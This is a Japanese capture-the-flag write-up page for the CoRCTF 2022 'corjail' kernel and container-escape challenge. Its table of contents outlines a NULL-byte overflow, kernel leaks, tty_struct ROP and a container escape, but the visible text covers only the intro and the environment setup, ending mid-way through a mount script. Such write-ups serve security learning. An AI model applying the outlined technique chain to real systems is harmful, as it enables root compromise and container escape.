<!doctype html><html itemscope itemtype=http://schema.org/WebPage lang=en class=no-js><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=generator content="Hugo 0.106.0"><link rel=alternate type=application/rss+xml href=https://wiki.smallkirby.xyz/ctf/cor-ctf/corjail/index.xml><meta name=robots content="index, follow"><link rel="shortcut icon" href=/favicons/favicon.ico><link rel=apple-touch-icon href=/favicons/apple-touch-icon-180x180.png sizes=180x180><link rel=icon type=image/png href=/favicons/favicon-16x16.png sizes=16x16><link rel=icon type=image/png href=/favicons/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/favicons/android-36x36.png sizes=36x36><link rel=icon type=image/png href=/favicons/android-48x48.png sizes=48x48><link rel=icon type=image/png href=/favicons/android-72x72.png sizes=72x72><link rel=icon type=image/png href=/favicons/android-96x96.png sizes=96x96><link rel=icon type=image/png href=/favicons/android-144x144.png sizes=144x144><link rel=icon type=image/png href=/favicons/android-192x192.png sizes=192x192><title>corjail | WIKIRBY</title><meta name=description content="corjail from CoRCTF2022"><meta property="og:title" content="corjail"><meta property="og:description" content="corjail from CoRCTF2022"><meta property="og:type" content="website"><meta property="og:url" content="https://wiki.smallkirby.xyz/ctf/cor-ctf/corjail/"><meta itemprop=name content="corjail"><meta itemprop=description content="corjail from CoRCTF2022"><meta name=twitter:card content="summary"><meta name=twitter:title content="corjail"><meta name=twitter:description content="corjail from CoRCTF2022"><link rel=preload href=/scss/main.min.c2fe61dfea4ddd9dbf87879182064bf7df5223c7a28cb8d900a6e180e53f1dd5.css as=style><link href=/scss/main.min.c2fe61dfea4ddd9dbf87879182064bf7df5223c7a28cb8d900a6e180e53f1dd5.css rel=stylesheet integrity><script src=https://code.jquery.com/jquery-3.6.0.min.js integrity=sha384-vtXRMe3mGCbOeY7l30aIg8H9p3GdeSe4IFlP6G8JMa7o7lXvnz3GFKzPxzJdPfGK crossorigin=anonymous></script>
<script defer src=https://unpkg.com/lunr@2.3.9/lunr.min.js integrity=sha384-203J0SNzyqHby3iU6hzvzltrWi/M41wOP5Gu+BiJMz5nwKykbkUx8Kp7iti0Lpli crossorigin=anonymous></script></head><body class=td-section><header><nav class="js-navbar-scroll navbar navbar-expand navbar-dark flex-column flex-md-row td-navbar"><a class=navbar-brand href=/><span class="navbar-brand__logo navbar-logo"><svg id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 500 500" style="enable-background:new 0 0 500 500"><g><path style="fill:#fff" d="M116.8525 421.9722c-5.7041.0-10.3442-4.3127-10.3442-9.6129V88.183c0-5.3002 4.6401-9.6117 10.3442-9.6117H320.858c3.0347.0 9.3959.5498 11.7506 2.6302l.3545.3442 58.905 63.2912c2.3101 2.491 2.9202 8.4928 2.9202 11.3184v256.2039c0 5.3002-4.6407 9.6129-10.3436 9.6129H116.8525z"/><g><g><g><path style="fill:#767676" d="M384.4445 423.2066H116.852c-6.3839.0-11.5786-4.8658-11.5786-10.8474V88.1831c0-5.9804 5.1947-10.8461 11.5786-10.8461h204.0062c.377.0 9.2786.0329 12.568 2.9389l.3947.3833 58.9508 63.337c3.2135 3.4652 3.2514 11.7924 3.2514 12.1593v256.2036C396.0231 418.3408 390.8284 423.2066 384.4445 423.2066zM116.5079 411.9189c.0848.0278.1999.0531.3441.0531h267.5925c.1442.0.2581-.0253.3441-.0531V156.1556c-.0076-.9033-.3593-3.7347-.7034-5.0037l-57.6527-61.9416c-1.4651-.3176-4.4533-.6389-5.5742-.6389H116.852c-.143.0-.2594.024-.3441.0531V411.9189zm267.4533-261.149zM327.0321 89.371v.0013V89.371z"/></g></g></g><g><g><path style="fill:#5b7fc0" d="M189.0874 210.1754l.0012-.0012c7.7751.0012 15.0295 4.1862 18.932 10.9234 1.9177 3.3159 2.9305 7.1011 2.9293 10.9378.0 5.8394-2.2733 11.3304-6.4032 15.4604-4.1288 4.1288-9.6186 6.4032-15.458 6.4032s-11.328-2.2733-15.458-6.4032-6.4032-9.6186-6.4056-15.4628c.0012-6.025 2.454-11.4897 6.4116-15.4473C177.5953 212.627 183.0601 210.1742 189.0874 210.1754zm7.993 21.8576c.0012-1.4042-.3687-2.7868-1.063-3.9887-1.4293-2.4684-4.0833-3.9995-6.9299-4.0019-4.4077.0024-7.993 3.5877-7.993 7.993.0 2.1356.832 4.1431 2.3427 5.6539 1.5083 1.5083 3.5159 2.3403 5.6503 2.3415 2.1356.0 4.1443-.8308 5.6539-2.3403S197.0816 234.1722 197.0804 232.033z"/><path style="opacity:.3;fill:#fff" d="M189.0898 210.176c7.7763.0 15.0283 4.1826 18.926 10.9151 1.9201 3.3136 2.9377 7.0988 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8613-12.0547.0024-21.8636-9.8066-21.8612-21.8613.0-6.0285 2.4516-11.4921 6.4116-15.452C177.5977 212.6276 183.0612 210.176 189.0898 210.176zm7.9941 21.8612c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.1861 236.239 197.0839 234.2399 197.0839 232.0372z"/><g><defs><path id="SVGID_1_" d="M194.7376 237.6875c-1.4461 1.4461-3.4452 2.3439-5.6479 2.3439-4.4077-.0024-7.9918-3.5865-7.9942-7.9942.0024-4.4125 3.5937-7.999 7.9942-7.9942 2.8443.0 5.497 1.5323 6.924 3.9983.6991 1.2067 1.0702 2.5881 1.0702 3.9959C197.0839 234.2399 196.1861 236.239 194.7376 237.6875z"/></defs><clipPath id="SVGID_2_"><use xlink:href="#SVGID_1_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_2_);fill:#fff" d="M190.0704 225.0237c-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0011 1.9546.7088 3.7452 1.8782 5.1354-1.7447-1.4674-2.8575-3.663-2.8588-6.116.0024-4.4125 3.5936-7.999 7.9942-7.9942 2.3802-1e-4 4.616 1.0833 6.1218 2.8788C193.7885 225.7247 191.9774 225.0237 190.0704 225.0237z"/><path style="opacity:.13;clip-path:url(#SVGID_2_);fill:#020202" d="M190.0704 225.0237c-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0011 1.9546.7088 3.7452 1.8782 5.1354-1.7447-1.4674-2.8575-3.663-2.8588-6.116.0024-4.4125 3.5936-7.999 7.9942-7.9942 2.3802-1e-4 4.616 1.0833 6.1218 2.8788C193.7885 225.7247 191.9774 225.0237 190.0704 225.0237z"/></g><g><defs><path id="SVGID_3_" d="M189.0898 210.176c7.7763.0 15.0283 4.1826 18.926 10.9151 1.9201 3.3136 2.9377 7.0988 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8613-12.0547.0024-21.8636-9.8066-21.8612-21.8613.0-6.0285 2.4516-11.4921 6.4116-15.452C177.5977 212.6276 183.0612 210.176 189.0898 210.176zm7.9941 21.8612c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.1861 236.239 197.0839 234.2399 197.0839 232.0372z"/></defs><clipPath id="SVGID_4_"><use xlink:href="#SVGID_3_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_4_);fill:#5b7fc0" d="M172.6595 215.6045c-3.96 3.96-6.4116 9.4235-6.4116 15.452-.0024 12.0547 9.8066 21.8636 21.8613 21.8612 12.0547.0024 21.8636-9.797 21.8613-21.8612.0024-3.8475-1.0151-7.6326-2.9353-10.9462-3.8977-6.7324-11.1497-10.9151-18.926-10.9151C182.0806 209.1953 176.6171 211.647 172.6595 215.6045z"/></g></g><rect x="198.8952" y="225.1043" style="fill:#5b7fc0" width="122.6266" height="13.8671"/></g><g><path style="fill:#d95140" d="M189.0874 155.7611l.0012-.0012c7.7751.0012 15.0295 4.1862 18.932 10.9234 1.9177 3.3159 2.9305 7.1011 2.9293 10.9378.0 5.8394-2.2733 11.3304-6.4032 15.4604-4.1288 4.1288-9.6186 6.4032-15.458 6.4032s-11.328-2.2733-15.458-6.4032-6.4032-9.6186-6.4056-15.4628c.0012-6.0249 2.454-11.4897 6.4116-15.4473C177.5953 158.2128 183.0601 155.7599 189.0874 155.7611zm7.993 21.8577c.0012-1.4042-.3687-2.7868-1.063-3.9887-1.4293-2.4684-4.0833-3.9995-6.9299-4.0019-4.4077.0024-7.993 3.5877-7.993 7.993.0 2.1356.832 4.1431 2.3427 5.6539 1.5083 1.5083 3.5159 2.3403 5.6503 2.3415 2.1356.0 4.1443-.8308 5.6539-2.3403C196.2508 181.7667 197.0816 179.758 197.0804 177.6188z"/><path style="opacity:.3;fill:#fff" d="M189.0898 155.7617c7.7763.0 15.0283 4.1826 18.926 10.9151 1.9201 3.3135 2.9377 7.0987 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8613-12.0547.0024-21.8636-9.8066-21.8612-21.8613.0-6.0285 2.4516-11.4921 6.4116-15.452C177.5977 158.2134 183.0612 155.7617 189.0898 155.7617zm7.9941 21.8613c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.1861 181.8248 197.0839 179.8256 197.0839 177.623z"/><g><defs><path id="SVGID_5_" d="M194.7376 183.2733c-1.4461 1.4461-3.4452 2.3439-5.6479 2.3439-4.4077-.0024-7.9918-3.5865-7.9942-7.9942.0024-4.4125 3.5937-7.9989 7.9942-7.9942 2.8443.0 5.497 1.5323 6.924 3.9983.6991 1.2067 1.0702 2.5881 1.0702 3.9959C197.0839 179.8256 196.1861 181.8248 194.7376 183.2733z"/></defs><clipPath id="SVGID_6_"><use xlink:href="#SVGID_5_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_6_);fill:#fff" d="M190.0704 170.6095c-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0011 1.9546.7088 3.7452 1.8782 5.1354-1.7447-1.4674-2.8575-3.663-2.8588-6.116.0024-4.4125 3.5936-7.999 7.9942-7.9942 2.3802-1e-4 4.616 1.0833 6.1218 2.8788C193.7885 171.3104 191.9774 170.6095 190.0704 170.6095z"/><path style="opacity:.13;clip-path:url(#SVGID_6_);fill:#020202" d="M190.0704 170.6095c-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0011 1.9546.7088 3.7452 1.8782 5.1354-1.7447-1.4674-2.8575-3.663-2.8588-6.116.0024-4.4125 3.5936-7.999 7.9942-7.9942 2.3802-1e-4 4.616 1.0833 6.1218 2.8788C193.7885 171.3104 191.9774 170.6095 190.0704 170.6095z"/></g><g><defs><path id="SVGID_7_" d="M189.0898 155.7617c7.7763.0 15.0283 4.1826 18.926 10.9151 1.9201 3.3135 2.9377 7.0987 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8613-12.0547.0024-21.8636-9.8066-21.8612-21.8613.0-6.0285 2.4516-11.4921 6.4116-15.452C177.5977 158.2134 183.0612 155.7617 189.0898 155.7617zm7.9941 21.8613c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.1861 181.8248 197.0839 179.8256 197.0839 177.623z"/></defs><clipPath id="SVGID_8_"><use xlink:href="#SVGID_7_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_8_);fill:#d95140" d="M172.6595 161.1903c-3.96 3.96-6.4116 9.4235-6.4116 15.452-.0024 12.0547 9.8066 21.8636 21.8613 21.8613 12.0547.0024 21.8636-9.797 21.8613-21.8613.0024-3.8474-1.0151-7.6326-2.9353-10.9462-3.8977-6.7324-11.1497-10.9151-18.926-10.9151C182.0806 154.7811 176.6171 157.2327 172.6595 161.1903z"/></g><rect x="198.8952" y="170.69" style="fill:#d95140" width="122.6266" height="13.8671"/></g><g><g><path style="fill:#56a55c" d="M189.5379 264.6147l.0012-.0012c7.7751.0012 15.0294 4.1862 18.932 10.9235 1.9177 3.3159 2.9305 7.1011 2.9293 10.9378.0 5.8394-2.2733 11.3304-6.4032 15.4604-4.1288 4.1288-9.6186 6.4032-15.458 6.4032-5.8394.0-11.3281-2.2733-15.458-6.4032-4.13-4.13-6.4032-9.6186-6.4056-15.4628.0012-6.0249 2.454-11.4897 6.4116-15.4472C178.0458 267.0663 183.5105 264.6135 189.5379 264.6147zm7.993 21.8576c.0012-1.4042-.3687-2.7868-1.063-3.9887-1.4293-2.4684-4.0833-3.9995-6.9299-4.0019-4.4077.0024-7.993 3.5877-7.993 7.993.0 2.1356.832 4.1431 2.3427 5.6538 1.5083 1.5083 3.5159 2.3403 5.6503 2.3415 2.1356.0 4.1443-.8308 5.6539-2.3403C196.7013 290.6202 197.5321 288.6115 197.5309 286.4723z"/><path style="opacity:.3;fill:#fff" d="M189.5403 264.6153c7.7763.0 15.0283 4.1826 18.926 10.9151 1.9201 3.3135 2.9377 7.0987 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8613-12.0547.0024-21.8636-9.8065-21.8612-21.8613.0-6.0285 2.4516-11.492 6.4116-15.452C178.0482 267.0669 183.5117 264.6153 189.5403 264.6153zm7.9941 21.8612c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9941.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.6366 290.6783 197.5344 288.6792 197.5344 286.4765z"/><g><defs><path id="SVGID_9_" d="M195.1881 292.1268c-1.4461 1.4461-3.4452 2.3439-5.6479 2.3439-4.4077-.0024-7.9918-3.5865-7.9942-7.9942.0024-4.4125 3.5937-7.9989 7.9942-7.9941 2.8443.0 5.497 1.5323 6.924 3.9983.6991 1.2067 1.0702 2.5881 1.0702 3.9959C197.5344 288.6792 196.6366 290.6783 195.1881 292.1268z"/></defs><clipPath id="SVGID_10_"><use xlink:href="#SVGID_9_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_10_);fill:#fff" d="M190.5209 279.463c-4.4005-.0048-7.9918 3.5817-7.9942 7.9941.0011 1.9547.7088 3.7452 1.8782 5.1354-1.7446-1.4674-2.8575-3.6631-2.8588-6.1161.0024-4.4125 3.5936-7.999 7.9942-7.9941 2.3802-1e-4 4.616 1.0833 6.1218 2.8788C194.239 280.164 192.4279 279.463 190.5209 279.463z"/><path style="opacity:.13;clip-path:url(#SVGID_10_);fill:#020202" d="M190.5209 279.463c-4.4005-.0048-7.9918 3.5817-7.9942 7.9941.0011 1.9547.7088 3.7452 1.8782 5.1354-1.7446-1.4674-2.8575-3.6631-2.8588-6.1161.0024-4.4125 3.5936-7.999 7.9942-7.9941 2.3802-1e-4 4.616 1.0833 6.1218 2.8788C194.239 280.164 192.4279 279.463 190.5209 279.463z"/></g><g><defs><path id="SVGID_11_" d="M189.5403 264.6153c7.7763.0 15.0283 4.1826 18.926 10.9151 1.9201 3.3135 2.9377 7.0987 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8613-12.0547.0024-21.8636-9.8065-21.8612-21.8613.0-6.0285 2.4516-11.492 6.4116-15.452C178.0482 267.0669 183.5117 264.6153 189.5403 264.6153zm7.9941 21.8612c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9941.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.6366 290.6783 197.5344 288.6792 197.5344 286.4765z"/></defs><clipPath id="SVGID_12_"><use xlink:href="#SVGID_11_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_12_);fill:#56a55c" d="M173.11 270.0439c-3.96 3.96-6.4116 9.4235-6.4116 15.452-.0024 12.0547 9.8066 21.8636 21.8613 21.8613 12.0547.0024 21.8636-9.797 21.8613-21.8613.0024-3.8474-1.0151-7.6326-2.9353-10.9462-3.8977-6.7325-11.1497-10.9151-18.926-10.9151C182.5311 263.6346 177.0676 266.0863 173.11 270.0439z"/></g></g><rect x="199.3456" y="279.5436" style="fill:#56a55c" width="122.6266" height="13.8671"/></g><g><g><path style="fill:#f1bc42" d="M189.0874 318.7208l.0012-.0012c7.7751.0012 15.0295 4.1862 18.932 10.9234 1.9177 3.3159 2.9305 7.1011 2.9293 10.9378.0 5.8394-2.2733 11.3305-6.4032 15.4604-4.1288 4.1288-9.6186 6.4032-15.458 6.4032s-11.328-2.2733-15.458-6.4032-6.4032-9.6186-6.4056-15.4628c.0012-6.025 2.454-11.4897 6.4116-15.4472C177.5953 321.1724 183.0601 318.7196 189.0874 318.7208zm7.993 21.8576c.0012-1.4042-.3687-2.7868-1.063-3.9887-1.4293-2.4684-4.0833-3.9995-6.9299-4.0019-4.4077.0024-7.993 3.5877-7.993 7.993.0 2.1356.832 4.1431 2.3427 5.6539 1.5083 1.5083 3.5159 2.3403 5.6503 2.3415 2.1356.0 4.1443-.8308 5.6539-2.3403S197.0816 342.7176 197.0804 340.5784z"/><path style="opacity:.3;fill:#fff" d="M189.0898 318.7214c7.7763.0 15.0283 4.1826 18.926 10.915 1.9201 3.3136 2.9377 7.0988 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8612-12.0547.0024-21.8636-9.8065-21.8612-21.8612.0-6.0285 2.4516-11.4921 6.4116-15.452C177.5977 321.173 183.0612 318.7214 189.0898 318.7214zm7.9941 21.8612c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.1861 344.7844 197.0839 342.7853 197.0839 340.5826z"/><g><defs><path id="SVGID_13_" d="M194.7376 346.2329c-1.4461 1.4461-3.4452 2.3439-5.6479 2.3439-4.4077-.0024-7.9918-3.5865-7.9942-7.9942.0024-4.4125 3.5937-7.999 7.9942-7.9942 2.8443.0 5.497 1.5323 6.924 3.9983.6991 1.2067 1.0702 2.5881 1.0702 3.9959C197.0839 342.7853 196.1861 344.7844 194.7376 346.2329z"/></defs><clipPath id="SVGID_14_"><use xlink:href="#SVGID_13_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_14_);fill:#fff" d="M190.0704 333.5691c-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0011 1.9547.7088 3.7452 1.8782 5.1354-1.7447-1.4674-2.8575-3.6631-2.8588-6.1161.0024-4.4125 3.5936-7.999 7.9942-7.9942 2.3802-1e-4 4.616 1.0834 6.1218 2.8788C193.7885 334.2701 191.9774 333.5691 190.0704 333.5691z"/><path style="opacity:.13;clip-path:url(#SVGID_14_);fill:#020202" d="M190.0704 333.5691c-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0011 1.9547.7088 3.7452 1.8782 5.1354-1.7447-1.4674-2.8575-3.6631-2.8588-6.1161.0024-4.4125 3.5936-7.999 7.9942-7.9942 2.3802-1e-4 4.616 1.0834 6.1218 2.8788C193.7885 334.2701 191.9774 333.5691 190.0704 333.5691z"/></g><g><defs><path id="SVGID_15_" d="M189.0898 318.7214c7.7763.0 15.0283 4.1826 18.926 10.915 1.9201 3.3136 2.9377 7.0988 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8612-12.0547.0024-21.8636-9.8065-21.8612-21.8612.0-6.0285 2.4516-11.4921 6.4116-15.452C177.5977 321.173 183.0612 318.7214 189.0898 318.7214zm7.9941 21.8612c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.1861 344.7844 197.0839 342.7853 197.0839 340.5826z"/></defs><clipPath id="SVGID_16_"><use xlink:href="#SVGID_15_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_16_);fill:#f1bc42" d="M172.6595 324.15c-3.96 3.96-6.4116 9.4235-6.4116 15.452-.0024 12.0547 9.8066 21.8636 21.8613 21.8612 12.0547.0024 21.8636-9.797 21.8613-21.8612.0024-3.8474-1.0151-7.6327-2.9353-10.9462-3.8977-6.7324-11.1497-10.9151-18.926-10.9151C182.0806 317.7407 176.6171 320.1924 172.6595 324.15z"/></g></g><rect x="198.8952" y="333.6497" style="fill:#f1bc42" width="122.6266" height="13.8671"/></g></g></svg></span><span class=navbar-brand__name>WIKIRBY</span></a><div class="td-navbar-nav-scroll ml-md-auto" id=main_navbar><ul class="navbar-nav mt-2 mt-lg-0"><li class="nav-item mr-4 mb-2 mb-lg-0"><a class="nav-link active" href=/><i class='fa-solid fa-book'></i><span class=active>Home</span></a></li><li class="nav-item mr-4 mb-2 mb-lg-0"><a class=nav-link href=/linux/><span>Linux</span></a></li><li class="nav-item mr-4 mb-2 mb-lg-0"><a class="nav-link active" href=/ctf/><span class=active>CTF</span></a></li><li class="nav-item mr-4 mb-2 mb-lg-0"><a class=nav-link href=/smallkirby/><span>smallkirby</span></a></li></ul></div><div class="navbar-nav d-none d-lg-block"><div class="td-search td-search--offline"><div class=td-search__icon></div><input type=search class="td-search__input form-control" placeholder="Search this site…" aria-label="Search this site…" autocomplete=off data-offline-search-index-json-src=/offline-search-index.7b23fb8099d77c9522c978807e9538d9.json data-offline-search-base-href=/ data-offline-search-max-results=10></div></div></nav></header><div class="container-fluid td-outer"><div class=td-main><div class="row flex-xl-nowrap"><aside class="col-12 col-md-3 col-xl-2 td-sidebar d-print-none"><div id=td-sidebar-menu class=td-sidebar__inner><form class="td-sidebar__search d-flex align-items-center"><div class="td-search td-search--offline"><div class=td-search__icon></div><input type=search class="td-search__input form-control" placeholder="Search this site…" aria-label="Search this site…" autocomplete=off data-offline-search-index-json-src=/offline-search-index.7b23fb8099d77c9522c978807e9538d9.json data-offline-search-base-href=/ data-offline-search-max-results=10></div><button class="btn btn-link td-sidebar__toggle d-md-none p-0 ml-3 fas fa-bars" type=button data-toggle=collapse data-target=#td-section-nav aria-controls=td-section-nav aria-expanded=false aria-label="Toggle section navigation"></button></form><nav class="collapse td-sidebar-nav" id=td-section-nav><ul class="td-sidebar-nav__section pr-md-3 ul-0"><li class="td-sidebar-nav__section-title td-sidebar-nav__section with-child active-path" id=m--li><a href=/ title=WIKIRBY class="align-left pl-0 td-sidebar-link td-sidebar-link__section tree-root" id=m-><span>Home</span></a><ul class=ul-1><li class="td-sidebar-nav__section-title td-sidebar-nav__section with-child active-path" id=m-ctf-li><a href=/ctf/ class="align-left pl-0 td-sidebar-link td-sidebar-link__section" id=m-ctf><span>CTF</span></a><ul class="ul-2 foldable"><li class="td-sidebar-nav__section-title td-sidebar-nav__section with-child active-path" id=m-ctfcor-ctf-li><a href=/ctf/cor-ctf/ class="align-left pl-0 td-sidebar-link td-sidebar-link__section" id=m-ctfcor-ctf><span>CoRCTF</span></a><ul class="ul-3 foldable"><li class="td-sidebar-nav__section-title td-sidebar-nav__section without-child active-path" id=m-ctfcor-ctfcorjail-li><a href=/ctf/cor-ctf/corjail/ class="align-left pl-0 active td-sidebar-link td-sidebar-link__section" id=m-ctfcor-ctfcorjail><span class=td-sidebar-nav-active-item>corjail</span></a></li></ul></li></ul></li><li class="td-sidebar-nav__section-title td-sidebar-nav__section with-child" id=m-linux-li><a href=/linux/ class="align-left pl-0 td-sidebar-link td-sidebar-link__section" id=m-linux><span>Linux</span></a><ul class="ul-2 foldable"><li class="td-sidebar-nav__section-title td-sidebar-nav__section with-child collapse" id=m-linuxpages-li><a href=/linux/pages/ class="align-left pl-0 td-sidebar-link td-sidebar-link__section" id=m-linuxpages><span>Page Handling</span></a><ul class="ul-3 foldable"><li class="td-sidebar-nav__section-title td-sidebar-nav__section without-child collapse" id=m-linuxpages4level-paging-li><a href=/linux/pages/4level-paging/ class="align-left pl-0 td-sidebar-link td-sidebar-link__section" id=m-linuxpages4level-paging><span>4-level paging</span></a></li></ul></li></ul></li><li class="td-sidebar-nav__section-title td-sidebar-nav__section without-child" id=m-smallkirby-li><a href=/smallkirby/ class="align-left pl-0 td-sidebar-link td-sidebar-link__section" id=m-smallkirby><span>smallkirby</span></a></li></ul></li></ul></nav></div></aside><aside class="d-none d-xl-block col-xl-2 td-sidebar-toc d-print-none"><div class="td-page-meta ml-2 pb-1 pt-4 mb-4"><a href=https://github.com/smallkirby/wikirby/tree/master/content/ctf/cor-ctf/corjail/_index.md class=td-page-meta--view target=_blank rel=noopener><i class="fa fa-file-alt fa-fw"></i> View page source</a>
<a href="https://github.com/smallkirby/wikirby/issues/new?title=corjail" class=td-page-meta--issue target=_blank rel=noopener><i class="fab fa-github fa-fw"></i> Improve this page</a></div><div class=td-toc><nav id=TableOfContents><ul><li><a href=#イントロ>イントロ</a></li><li><a href=#devenv-setup>devenv setup</a></li><li><a href=#static-analysis>static analysis</a><ul><li><a href=#misc>misc</a></li><li><a href=#module-analysis-rev>module analysis (rev)</a></li><li><a href=#seccomp>seccomp</a></li></ul></li><li><a href=#vuln-null-byte-overflow>Vuln: NULL-byte overflow</a></li><li><a href=#pre-requisites>pre-requisites</a><ul><li><a href=#sys_poll><code>sys_poll</code></a></li><li><a href=#add_key--keyctl-syscall><code>add_key</code> / <code>keyctl</code> syscall</a></li></ul></li><li><a href=#kbase-leak-via-user_key_payload-and-seq_operations>kbase leak via <code>user_key_payload</code> and <code>seq_operations</code></a></li><li><a href=#leak-kheap-via-tty_struct--tty_file_private>leak kheap via <code>tty_struct</code> / <code>tty_file_private</code></a></li><li><a href=#get-rip-by-overwriting-tty_structops>get RIP by overwriting <code>tty_struct.ops</code></a></li><li><a href=#get-root-by-krop-on-tty_struct-itself>get root by kROP on <code>tty_struct</code> itself</a></li><li><a href=#container-escape>container escape</a></li><li><a href=#アウトロ>アウトロ</a></li><li><a href=#full-exploit>Full Exploit</a></li><li><a href=#参考>参考</a></li></ul></nav></div></aside><main class="col-12 col-md-9 col-xl-8 pl-md-5" role=main><nav aria-label=breadcrumb class=td-breadcrumbs><ol class=breadcrumb><li class=breadcrumb-item><a href=https://wiki.smallkirby.xyz/ctf/>CTF</a></li><li class=breadcrumb-item><a href=https://wiki.smallkirby.xyz/ctf/cor-ctf/>CoRCTF</a></li><li class="breadcrumb-item active" aria-current=page><a href=https://wiki.smallkirby.xyz/ctf/cor-ctf/corjail/ aria-disabled=true class="btn-link disabled">corjail</a></li></ol></nav><div class=td-content><h1>corjail</h1><div class=lead>corjail from CoRCTF2022</div><header class=article-meta></header><h2 id=イントロ>イントロ</h2><p>いちにょっき、ににょっき、さんにょっき！！こんにちは、ニートです。
最近は少しフロント周りを触っていたということで、となると反動でpwnがやりたくなる季節ですね。とはいっても今週からまた新しいインターンに行くことになっているので、様々な環境の変化に正気を保つのがギリギリな今日この頃。というわけで、今日は更に初めての経験をするべくdocker escape pwn問題を解いていきましょう。
解くのは<strong>corCTF 2022</strong>の<strong>corjail</strong>という問題。確か前回のエントリでもcorCTFの問題を解いた気がするのですが、このCTFの問題はかなり好きです。初めてのdocker escape問題ということで、解いてる時に詰まったところや失敗したところ等も含めて書き連ねていこうと思います。まぁ詰まったところと言ってもwriteupをカンニングしたんですけどね。ただ、これは気をつけていることと言うかpwnのwriteupを先に見る時にいつもやることですが、writeupは薄目で見るようにしています。細かいexploit内容は読まずに、keyword的なものだけピックアップして、それらをどう使うかは自分でちゃんと考えるみたいな。カンニングするにしても、最初っから全部見ちゃうとおもしろみがなくなっちゃうので。このエントリでは、色々試行錯誤したり詰まったところも含めたデバッグ風景も一緒に書いていこうと思います。</p><h2 id=devenv-setup>devenv setup</h2><p>まずは<a href=https://github.com/Crusaders-of-Rust/corCTF-2022-public-challenge-archive/tree/master/pwn/corjail/task/build>GitHub</a>から問題をcloneしてきます。
配布ファイルがたくさんあるので、5分ほどuouoしましょう。
続いて<code>build_kernel.sh</code>でKernelイメージをビルドします(スクリプト中だとシングルコアでビルドすることになっていて永遠に終わらないため、適宜修正しましょう)。
なんか途中でSSL周りのエラーが出るため、<code>MODULES_SIG_ALL</code>らへんを無効化してしまいましょう。
続いて、<code>build_image.sh</code>でゲストファイルシステムを作成します。一応いろいろなことをしているので、evilなことをされないか自分でスクリプトの中身を見ましょう。作成されるファイルは<code>build/corors/coros.qcow2</code>です。QCOW形式のファイルは、以下の感じでmount/umountできます:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-mount.bash data-lang=mount.bash><span style=display:flex><span><span style=color:#75715e>### mount.bash</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#!/bin/bash</span>
</span></span><span style=display:flex><span>set -eu
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>MNTPOINT<span style=color:#f92672>=</span>/tmp/hoge
